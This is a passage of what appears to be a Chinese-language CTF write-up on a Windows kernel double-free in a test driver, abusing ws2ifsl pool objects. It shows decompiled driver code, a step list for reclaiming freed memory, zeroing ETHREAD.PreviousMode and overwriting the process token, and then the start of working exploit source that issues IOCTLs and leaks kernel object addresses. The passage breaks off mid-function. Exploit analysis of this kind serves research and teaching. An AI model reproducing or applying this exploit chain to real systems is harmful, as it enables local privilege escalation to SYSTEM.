</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( v14 <span style="color:#ff79c6">==</span> IoGetCurrentProcess() )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      Pool2 <span style="color:#ff79c6">=</span> ExAllocatePool2(<span style="color:#bd93f9">0x61</span>i64, <span style="color:#bd93f9">0x110</span>i64, &#39;P2sW&#39;);
</span></span><span style="display:flex;"><span>      _Pool2 <span style="color:#ff79c6">=</span> Pool2;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( Pool2 )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)Pool2 <span style="color:#ff79c6">=</span> &#39;corP&#39;;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)(Pool2 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">=</span> PsGetCurrentProcessId();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)(_Pool2 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x100</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)(_Pool2 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>i64;
</span></span><span style="display:flex;"><span>        LOBYTE(_Mode) <span style="color:#ff79c6">=</span> Mode;
</span></span><span style="display:flex;"><span>        v12 <span style="color:#ff79c6">=</span> InitializeRequestQueue(_Pool2, (<span style="color:#8be9fd">int</span>)_object, _Mode, (<span style="color:#8be9fd">int</span>)MasterIrp, Blink);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( v12 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          LOBYTE(__Mode) <span style="color:#ff79c6">=</span> Mode;
</span></span><span style="display:flex;"><span>          v12 <span style="color:#ff79c6">=</span> InitializeCancelQueue(_Pool2, (<span style="color:#8be9fd">int</span>)_object, __Mode, (<span style="color:#8be9fd">int</span>)Flink, Blink);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( v12 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          pFileObj<span style="color:#ff79c6">-&gt;</span>FsContext <span style="color:#ff79c6">=</span> (PVOID)_Pool2;
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// ...
</span></span></span></code></pre></div><p>InitializeRequestQueue &amp;&amp; InitializeCancelQueue: 初始化Apc请求/取消队列</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">InitializeRequestQueue</span>(PVOID Pool, PVOID a2, <span style="color:#8be9fd">char</span> Mode, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IRP</span> <span style="color:#ff79c6">*</span>a4, PVOID ApcContext)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// ... 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  ApcRoutine <span style="color:#ff79c6">=</span> a4;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>((_BYTE <span style="color:#ff79c6">*</span>)Pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">32</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)Pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)Pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">16</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)Pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>) <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)Pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">16</span>;
</span></span><span style="display:flex;"><span>  KeInitializeSpinLock((PKSPIN_LOCK)Pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#ff79c6">=</span> PsWrapApcWow64Thread(<span style="color:#ff79c6">&amp;</span>ApcContext, <span style="color:#ff79c6">&amp;</span>ApcRoutine);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( v8 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v10 <span style="color:#ff79c6">=</span> Mode;
</span></span><span style="display:flex;"><span>    KeInitializeApc(
</span></span><span style="display:flex;"><span>      (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)Pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">48</span>,
</span></span><span style="display:flex;"><span>      a2,
</span></span><span style="display:flex;"><span>      <span style="color:#bd93f9">0</span>i64,
</span></span><span style="display:flex;"><span>      guard_check_icall_nop,
</span></span><span style="display:flex;"><span>      RequestRundownRoutine,
</span></span><span style="display:flex;"><span>      ApcRoutine,
</span></span><span style="display:flex;"><span>      v10,
</span></span><span style="display:flex;"><span>      ApcContext);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)v8;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">InitializeCancelQueue</span>(PVOID pool, PVOID obj, <span style="color:#8be9fd">char</span> mode, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IRP</span> <span style="color:#ff79c6">*</span>a4, PVOID ApcContext)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  NTSTATUS v8; <span style="color:#6272a4">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v10; <span style="color:#6272a4">// [rsp+30h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  PVOID ApcRoutine; <span style="color:#6272a4">// [rsp+68h] [rbp+20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  ApcRoutine <span style="color:#ff79c6">=</span> a4;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>((_BYTE <span style="color:#ff79c6">*</span>)pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">152</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">18</span>) <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">136</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">17</span>) <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">136</span>;
</span></span><span style="display:flex;"><span>  KeInitializeSpinLock((PKSPIN_LOCK)pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">20</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#ff79c6">=</span> PsWrapApcWow64Thread(<span style="color:#ff79c6">&amp;</span>ApcContext, <span style="color:#ff79c6">&amp;</span>ApcRoutine);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( v8 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v10 <span style="color:#ff79c6">=</span> mode;
</span></span><span style="display:flex;"><span>    KeInitializeApc(
</span></span><span style="display:flex;"><span>      (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)pool <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">168</span>,
</span></span><span style="display:flex;"><span>      obj,
</span></span><span style="display:flex;"><span>      <span style="color:#bd93f9">0</span>i64,
</span></span><span style="display:flex;"><span>      guard_check_icall_nop,
</span></span><span style="display:flex;"><span>      CancelRundownRoutine,
</span></span><span style="display:flex;"><span>      ApcRoutine,
</span></span><span style="display:flex;"><span>      v10,
</span></span><span style="display:flex;"><span>      ApcContext);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)v8;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>释放的位置在DispatchClose函数中 <code>ExFreePoolWithTag</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>  FsContext <span style="color:#ff79c6">=</span> (PVOID <span style="color:#ff79c6">*</span>)a2<span style="color:#ff79c6">-&gt;</span>Tail.Overlay.CurrentStackLocation<span style="color:#ff79c6">-&gt;</span>FileObject<span style="color:#ff79c6">-&gt;</span>FsContext;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)FsContext <span style="color:#ff79c6">==</span> &#39;corP&#39; )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    ObfDereferenceObject(FsContext[<span style="color:#bd93f9">7</span>]);
</span></span><span style="display:flex;"><span>    DereferenceProcessContext(FsContext);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_8</span>:
</span></span><span style="display:flex;"><span>    v4 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">goto</span> LABEL_9;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>需要注意的是这个池大小 0x110，加上PoolHeader就是0x120</p>
<p><strong>在CloseHandle时，调用<code>ObfDereferenceObject</code>函数，也就是将这个位置上的值<code>-1</code>。因此我们可以将<code>ETHREAD.PreviousMode</code> 从 1减为0。</strong></p>
<p>因此大致流程</p>
<ul>
<li>heap spray 减少碎片</li>
<li>allocate ContiguousMemory &amp;&amp; MDL</li>
<li>free ContiguousMemory &amp;&amp; MDL</li>
<li>使用 ws2ifsl 占位MDL (Ws2P ProcData)</li>
<li>double free ContiguousMemory &amp;&amp; MDL</li>
<li>使用Io占位MDL，修改Ws2P偏移为28的值为<code>ETHREAD.PreviousMode</code></li>
<li>CloseHandler 导致<code>ETHREAD.PreviousMode</code>为0</li>
<li>NtWriteVirtualMemory 任意地址写，替换token</li>
</ul>
<p>但是改成x86的程序后，导致泄露的EPROCESS地址被截断。</p>
<p>因此官方给出三个文件</p>
<ul>
<li>helper.exe 64位，使用NtQuerySystemInfomation获取信息</li>
<li>poc.exe: 32位，</li>
<li>exp.exe：调用两个文件</li>
<li>使用了命名管道进行通信同步</li>
</ul>
<p>必须等待回收资源才能减去1</p>
<p>Nu1L 提了一个关闭 dynbase，通过这个也可以修改</p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=msvc-170">/DYNAMICBASE（使用地址空间布局随机化功能） | Microsoft Learn</a></li>
</ul>
<p>exp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;Windows.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;winternl.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;iostream&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;vector&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#pragma comment(lib, &#34;ntdll&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Device 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define DEVICE            L&#34;\\\\.\\IoctlTest&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define IOCTL_ALLOCATE32  0x9C402400
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define IOCTL_RELEASE32   0x9C402408
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define IOCTL_ALLOCATE64  0x9C402404
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define IOCTL_RELEASE64   0x9C40240C
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span>HANDLE g_hDevice;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VOID <span style="color:#50fa7b">Allocate64</span>(ULONG uSize)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//wprintf(L&#34;[+] Allocate64\r\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	BYTE szInbuffer[<span style="color:#bd93f9">4</span>] <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
</span></span><span style="display:flex;"><span>	BYTE szOutBuffer[<span style="color:#bd93f9">12</span>] <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(PULONG)szInbuffer <span style="color:#ff79c6">=</span> uSize;
</span></span><span style="display:flex;"><span>	DWORD dwBytesReturned;
</span></span><span style="display:flex;"><span>	BOOL ret <span style="color:#ff79c6">=</span> FALSE;
</span></span><span style="display:flex;"><span>	ret <span style="color:#ff79c6">=</span> DeviceIoControl(
</span></span><span style="display:flex;"><span>		g_hDevice, 
</span></span><span style="display:flex;"><span>		IOCTL_ALLOCATE64, 
</span></span><span style="display:flex;"><span>		szInbuffer, <span style="color:#ff79c6">sizeof</span>(szInbuffer), 
</span></span><span style="display:flex;"><span>		szOutBuffer, <span style="color:#ff79c6">sizeof</span>(szOutBuffer), 
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>dwBytesReturned, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (FALSE <span style="color:#ff79c6">==</span> ret)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error IOCTL_ALLOCATE64</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VOID <span style="color:#50fa7b">Allocate32</span>(ULONG uSize)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//wprintf(L&#34;[+] Allocate32\r\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	BYTE szInbuffer[<span style="color:#bd93f9">4</span>] <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
</span></span><span style="display:flex;"><span>	BYTE szOutBuffer[<span style="color:#bd93f9">8</span>] <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(PULONG)szInbuffer <span style="color:#ff79c6">=</span> uSize;
</span></span><span style="display:flex;"><span>	DWORD dwBytesReturned;
</span></span><span style="display:flex;"><span>	BOOL ret <span style="color:#ff79c6">=</span> FALSE;
</span></span><span style="display:flex;"><span>	ret <span style="color:#ff79c6">=</span> DeviceIoControl(
</span></span><span style="display:flex;"><span>		g_hDevice,
</span></span><span style="display:flex;"><span>		IOCTL_ALLOCATE32,
</span></span><span style="display:flex;"><span>		szInbuffer, <span style="color:#ff79c6">sizeof</span>(szInbuffer),
</span></span><span style="display:flex;"><span>		szOutBuffer, <span style="color:#ff79c6">sizeof</span>(szOutBuffer),
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>dwBytesReturned, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (FALSE <span style="color:#ff79c6">==</span> ret)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error IOCTL_ALLOCATE32</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//if (!ulInputBufferLength || !ulOutputBufferLength)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//{
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//	v3 = 0xC000000D;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//	goto LABEL_34;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//}
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>VOID <span style="color:#50fa7b">Free64</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//wprintf(L&#34;[+] Free64\r\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	BYTE buffer[] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;h5&#34;</span>;
</span></span><span style="display:flex;"><span>	BOOL ret <span style="color:#ff79c6">=</span> FALSE;
</span></span><span style="display:flex;"><span>	DWORD dwBytesReturned <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	ret <span style="color:#ff79c6">=</span> DeviceIoControl(
</span></span><span style="display:flex;"><span>		 g_hDevice, 
</span></span><span style="display:flex;"><span>		IOCTL_RELEASE64, 
</span></span><span style="display:flex;"><span>		buffer, <span style="color:#ff79c6">sizeof</span>(buffer), 
</span></span><span style="display:flex;"><span>		buffer, <span style="color:#ff79c6">sizeof</span>(buffer), 
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>dwBytesReturned, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (FALSE <span style="color:#ff79c6">==</span> ret)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;Error IOCTL_RELEASE64</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// wprintf(L&#34;first free succeeded, dwOutput = %d\n&#34;, dwOutput);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VOID <span style="color:#50fa7b">Free32</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//wprintf(L&#34;[+] Free32\r\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	BYTE buffer[] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;h5&#34;</span>;
</span></span><span style="display:flex;"><span>	BOOL ret <span style="color:#ff79c6">=</span> FALSE;
</span></span><span style="display:flex;"><span>	DWORD dwBytesReturned <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	ret <span style="color:#ff79c6">=</span> DeviceIoControl(
</span></span><span style="display:flex;"><span>		g_hDevice,
</span></span><span style="display:flex;"><span>		IOCTL_RELEASE32,
</span></span><span style="display:flex;"><span>		buffer, <span style="color:#ff79c6">sizeof</span>(buffer),
</span></span><span style="display:flex;"><span>		buffer, <span style="color:#ff79c6">sizeof</span>(buffer),
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>dwBytesReturned, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (FALSE <span style="color:#ff79c6">==</span> ret)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;Error IOCTL_RELEASE32</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	};
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Get Kernel Infomation
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>ULONG64   g_SystemEprocess;
</span></span><span style="display:flex;"><span>ULONG64   g_CurrentEprocess;
</span></span><span style="display:flex;"><span>ULONG64   g_ExploitEthread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HANDLE    g_ThreadExploitHandle;
</span></span><span style="display:flex;"><span>DWORD     g_CurrentPid;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// NtQuerySystemInfomation Leak Information
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_SYSTEM_HANDLE_TABLE_ENTRY_INFO</span> {
</span></span><span style="display:flex;"><span>	USHORT UniqueProcessId;
</span></span><span style="display:flex;"><span>	USHORT CreatorBackTraceIndex;
</span></span><span style="display:flex;"><span>	UCHAR ObjectTypeIndex;
</span></span><span style="display:flex;"><span>	UCHAR HandleAttributes;
</span></span><span style="display:flex;"><span>	USHORT HandleValue;
</span></span><span style="display:flex;"><span>	PVOID Object;
</span></span><span style="display:flex;"><span>	ULONG GrantedAccess;
</span></span><span style="display:flex;"><span>	LONG __PADDING__[<span style="color:#bd93f9">1</span>];
</span></span><span style="display:flex;"><span>} SYSTEM_HANDLE_TABLE_ENTRY_INFO, <span style="color:#ff79c6">*</span> PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_SYSTEM_HANDLE_INFORMATION</span> {
</span></span><span style="display:flex;"><span>	ULONG NumberOfHandles;
</span></span><span style="display:flex;"><span>	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span style="color:#bd93f9">1</span>];
</span></span><span style="display:flex;"><span>} SYSTEM_HANDLE_INFORMATION, <span style="color:#ff79c6">*</span> PSYSTEM_HANDLE_INFORMATION;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define SystemModuleInformation			(SYSTEM_INFORMATION_CLASS)0x0b
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define SystemHandleInformation			(SYSTEM_INFORMATION_CLASS)0x10
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span>VOID <span style="color:#50fa7b">LeakByQuerySystemInfomation</span>() 
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	DWORD CurPid <span style="color:#ff79c6">=</span> GetCurrentProcessId();
</span></span><span style="display:flex;"><span>	g_CurrentPid <span style="color:#ff79c6">=</span> CurPid;
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	HANDLE hSelf <span style="color:#ff79c6">=</span> OpenProcess(PROCESS_QUERY_INFORMATION, <span style="color:#bd93f9">0</span>, CurPid);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (hSelf <span style="color:#ff79c6">==</span> INVALID_HANDLE_VALUE <span style="color:#ff79c6">||</span> hSelf <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) 
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error OpenProcess</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// kthread and ktoken
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	PSYSTEM_HANDLE_INFORMATION HandleInfo <span style="color:#ff79c6">=</span> (PSYSTEM_HANDLE_INFORMATION)malloc(<span style="color:#bd93f9">0x100</span>);
</span></span><span style="display:flex;"><span>	ULONG OutBufLen <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	NTSTATUS status <span style="color:#ff79c6">=</span> NtQuerySystemInformation(SystemHandleInformation, HandleInfo, <span style="color:#bd93f9">0x100</span>, <span style="color:#ff79c6">&amp;</span>OutBufLen);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (status <span style="color:#ff79c6">==</span> STATUS_INFO_LENGTH_MISMATCH) 
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		free(HandleInfo);
</span></span><span style="display:flex;"><span>		HandleInfo <span style="color:#ff79c6">=</span> (SYSTEM_HANDLE_INFORMATION<span style="color:#ff79c6">*</span>)malloc(OutBufLen);
</span></span><span style="display:flex;"><span>		status <span style="color:#ff79c6">=</span> NtQuerySystemInformation(SystemHandleInformation, HandleInfo, OutBufLen, <span style="color:#ff79c6">&amp;</span>OutBufLen);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (HandleInfo <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) 
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error NtQuerySystemInformation SystemHandleInformation</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// PID 当前进程 Handle 没有指定
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> HandleInfo<span style="color:#ff79c6">-&gt;</span>NumberOfHandles; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>	{
